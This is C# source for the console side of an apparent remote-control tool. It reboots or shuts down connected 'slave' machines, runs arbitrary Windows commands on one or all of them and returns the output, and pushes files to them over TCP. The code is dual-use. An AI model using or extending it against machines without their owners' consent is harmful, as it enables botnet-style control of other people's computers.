using System.IO;
using System.Net.Sockets;
using System.Text.RegularExpressions;

namespace Master
{
    // Functions to send messages on client
    public class Commands
    {
        /// <summary>
        /// This command Off or Reboot client
        /// </summary>
        public static void OffCommand(string[] Args)
        {
            if (Args.Length > 1)
            {
                switch (Args[1])
                {
                    case "-h":
                        MasterConsole.ShowHelp(CONSOLE_HELP.off);
                        break;
                    case "-all":
                        if (Args[2] == "-r")
                        {
                            // Reboot al client
                            foreach (TcpClient cl in Status.ClientsConnected)
                            {
                                if (Connection.ClientMessage("<REBT>", cl.Client).Contains("true"))
                                {
                                    MasterConsole.ConsoleMessage($"{Status.GetClientIp(cl.Client)}: Sucess", CONSOLE_MSG.success);
                                }
                            }
                        }
                        else
                        {
                            // Off all client
                            foreach (TcpClient cl in Status.ClientsConnected)
                            {
                                if (Connection.ClientMessage("<OFF>", cl.Client).Contains("true"))
                                {
                                    MasterConsole.ConsoleMessage($"{Status.GetClientIp(cl.Client)}: Sucess", CONSOLE_MSG.success);
                                }
                            }
                        }
                        break;

                    case "-r":
                        if (Args.Length >= 3)
                        {
                            switch (Args[2])
                            {
                                case "-s":
                                    if (Args.Length > 3)
                                    {
                                        if (!Check.ContainsLetters(Args[3]))
                                        {
                                            if (Status.ClientsConnected.Count > 0)
                                            {
                                                if (Status.CheckConnectedClient(Status.ClientsConnected[Converters.ParseValidNumber(Args[3])].Client))
                                                {
                                                    if (Connection.ClientMessage("<REBT>", Status.ClientsConnected[Converters.ParseValidNumber(Args[3])].Client).Contains("true"))
                                                    {
                                                        MasterConsole.ConsoleMessage("sucess", CONSOLE_MSG.success);
                                                    }
                                                }
                                            }
                                            else
                                            {
                                                MasterConsole.ConsoleMessage("Any slaves connected", CONSOLE_MSG.warning);

                                            }

                                        }
                                    }
                                    else
                                    {
                                        MasterConsole.ConsoleMessage("Invalid arguments", CONSOLE_MSG.error);
                                    }
                                    break;
                                default:
                                    MasterConsole.ConsoleMessage("Invalid arguments", CONSOLE_MSG.error);
                                    break;
                            }
                        }
                        else
                        {
                            if (Connection.ClientMessage("<REBT>", Status.CurrentClient.Client).Contains("true"))
                            {
                                MasterConsole.ConsoleMessage("sucess", CONSOLE_MSG.success);
                            }
                        }
                        break;

                    case "-s":
                        if (Args.Length > 2)
                        {
                            if (!Check.ContainsLetters(Args[2]))
                            {
                                if (Status.ClientsConnected.Count > 0)
                                {
                                    if (Status.CheckConnectedClient(Status.ClientsConnected[Converters.ParseValidNumber(Args[2])].Client))
                                    {
                                        if (Connection.ClientMessage("<OFF>", Status.ClientsConnected[Converters.ParseValidNumber(Args[2])].Client).Contains("true"))
                                        {
                                            MasterConsole.ConsoleMessage("sucess", CONSOLE_MSG.success);
                                        }
                                    }
                                }
                                else
                                {
                                    MasterConsole.ConsoleMessage("Any slaves connected", CONSOLE_MSG.warning);

                                }

                            }
                        }
                        else
                        {
                            MasterConsole.ConsoleMessage("Invalid arguments", CONSOLE_MSG.error);
                        }
                        break;
                    default:
                        MasterConsole.ConsoleMessage("Invalid arguments", CONSOLE_MSG.error);
                        break;
                }
            }
            else
            {
                if (Connection.ClientMessage("<OFF>", Status.CurrentClient.Client).Contains("true"))
                {
                    MasterConsole.ConsoleMessage("sucess", CONSOLE_MSG.success);
                }
            }

        }

        /// <summary>
        /// Close console and stop socket
        /// </summary>
        public static void ExitCommand(string[] Args)
        {
            // Contains arguments
            if (Args.Length > 1)
            {
                switch (Args[1])
                {
                    case "-h":
                        MasterConsole.ShowHelp(CONSOLE_HELP.exit);
                        break;
                    default:
                        MasterConsole.ConsoleMessage("Combination of arguments is wrong", CONSOLE_MSG.error);
                        break;
                }
            }
            else
            {
                MasterConsole.StopConsole();
            }
        }

        /// <summary>
        /// Get all clients connected
        /// </summary>
        public static void SlavesCommand(string[] Args)
        {
            // Contains arguments
            if (Args.Length > 1)
            {
                switch (Args[1])
                {
                    case "-h":
                        MasterConsole.ShowHelp(CONSOLE_HELP.slaves);
                        break;
                    case "-c": // c of "Curretn"
                        if (Args.Length > 2)
                        {
                            if (Args[2] == "set")
                            {

                                int id = Converters.ParseValidNumber(Args[3]);
                                Slaves.SetCurrentSlave(id);
                            }
                            else
                            {
                                MasterConsole.ConsoleMessage("Invalid arguments", CONSOLE_MSG.error);
                            }
                        }
                        else
                        {
                            Slaves.PrintCurrentSlave();
                        }
                        break;
                    default:
                        MasterConsole.ConsoleMessage("Combination of arguments is wrong", CONSOLE_MSG.error);
                        break;
                }
            }
            else
            {
                Slaves.PrintSlaves();
            }
        }

        /// <summary>
        /// Execute widows command in client
        /// </summary>
        public static void ExecCommand(string[] Args, string cmd)
        {
            if (Args.Length > 1)
            {
                if (Args.Length >= 2)
                {
                    switch (Args[1])
                    {
                        case "-h":
                            MasterConsole.ShowHelp(CONSOLE_HELP.exec);
                            break;
                        case "-all":
                            string com = Converters.TextBetween(cmd, "[", "]");
                            if (com != "")
                            {
                                foreach(TcpClient cl in Status.ClientsConnected)
                                {
                                    string result = Connection.ClientMessage("<EXEC>" + com, cl.Client);
                                    if (result.Contains("<CMDOUT>"))
                                    {
                                        MasterConsole.ConsoleMessage($"{Status.GetClientIp(cl.Client)}: Succes", CONSOLE_MSG.success);
                                        Converters.CMDOutput(result);
                                    }
                                    else
                                    {
                                        MasterConsole.ConsoleMessage("Not success", CONSOLE_MSG.error);
                                    }
                                }
                            }
                            else
                            {
                                MasterConsole.ConsoleMessage("Invalid Argument", CONSOLE_MSG.error);
                            }
                            break;
                        case "-s": // s of "slave"
                            string command = Converters.TextBetween(cmd, "[", "]");
                            if (command != "")
                            {
                                string result = Connection.ClientMessage("<EXEC>" + command, Status.CurrentClient.Client);
                                if (result.Contains("<CMDOUT>"))
                                {
                                    Converters.CMDOutput(result);
                                }
                                else
                                {
                                    MasterConsole.ConsoleMessage("Not success", CONSOLE_MSG.error);
                                }
                            }
                            else
                            {
                                MasterConsole.ConsoleMessage("Invalid Argument", CONSOLE_MSG.error);
                            }

                            break;
                        default:
                            MasterConsole.ConsoleMessage("Invalid argument", CONSOLE_MSG.error);
                            break;
                    }
                }
                else
                {
                    string command = Converters.TextBetween(cmd, "[", "]");
                    string result = Connection.ClientMessage("<EXEC>" + command, Status.CurrentClient.Client);
                    if (result.Contains("<CMDOUT>"))
                    {
                        Converters.CMDOutput(result);
                    }
                    else
                    {
                        MasterConsole.ConsoleMessage("Not success", CONSOLE_MSG.error);
                    }
                }

            }
            else
            {
                MasterConsole.ConsoleMessage("Not found any command", CONSOLE_MSG.error);
            }
        }

        /// <summary>
        /// Send file to client
        /// </summary>
        public static void FileCommand(string[] Args, string cmd)
        {
            int argLen = Check.FixedLenght(Args,cmd,'\"');
            if (argLen > 1)
            {
                string filePath = Regex.Match(cmd, "\"[^\"]*\"").Value;
                filePath = filePath.Replace("\"", " ");

                switch (Args[1])
                {
                    case "-h":
                        //! Show Help
                        MasterConsole.ShowHelp(CONSOLE_HELP.file);
                        break;
                    case "-f":
                        if (!Check.StringBlank(filePath))
                        {
                            if (argLen > 3)
                            {
                                if (cmd.Contains("-s"))
                                {
                                    int slv = Converters.ParseValidNumber(Auxiliars.GetParameter(Args, "-s"));

                                    if(slv >= 0)
                                    {
                                        if (File.Exists(filePath))
                                        {
                                            byte[] bytes = Auxiliars.GetFileBytes(filePath);

                                            Connection.SendFile(bytes, Status.ClientsConnected[slv].Client, filePath);
                                        }
                                        else
                                        {
                                            MasterConsole.ConsoleMessage("The file not exists", CONSOLE_MSG.error);

                                        }
                                    }
                                    else
                                    {
                                        MasterConsole.ConsoleMessage("Not clients connected", CONSOLE_MSG.warning);

                                    }


                                }
                                else if (cmd.Contains("-all"))
                                {
                                    if (File.Exists(filePath))
                                    {
                                        byte[] bytes = Auxiliars.GetFileBytes(filePath);

                                        foreach (TcpClient cl in Status.ClientsConnected)
                                        {
                                            Connection.SendFile(bytes, cl.Client, filePath);
                                        }
                                    }
                                    else
                                    {
                                        MasterConsole.ConsoleMessage("The file not exists", CONSOLE_MSG.error);

                                    }
                                }
                                else
                                {
                                    MasterConsole.ConsoleMessage("File -h for help", CONSOLE_MSG.info);
                                }
                            }
                            else
                            {
                                if (File.Exists(filePath))
                                {
                                    byte[] bytes = Auxiliars.GetFileBytes(filePath);
                                    Connection.SendFile(bytes, Status.CurrentClient.Client, filePath);
                                }
                                else
                                {
                                    MasterConsole.ConsoleMessage("The file not exists", CONSOLE_MSG.error);

                                }
                            }
                        }
                        else
                        {
                            MasterConsole.ConsoleMessage("File?", CONSOLE_MSG.error);
                        }
                        break;

                    default:
                        MasterConsole.ConsoleMessage($"Unkwon Parameter '{Args[1]}'", CONSOLE_MSG.error);
                        break;
                }

            }
            else
            {
                MasterConsole.ConsoleMessage("File?", CONSOLE_MSG.error);
            }

        }
    }
}
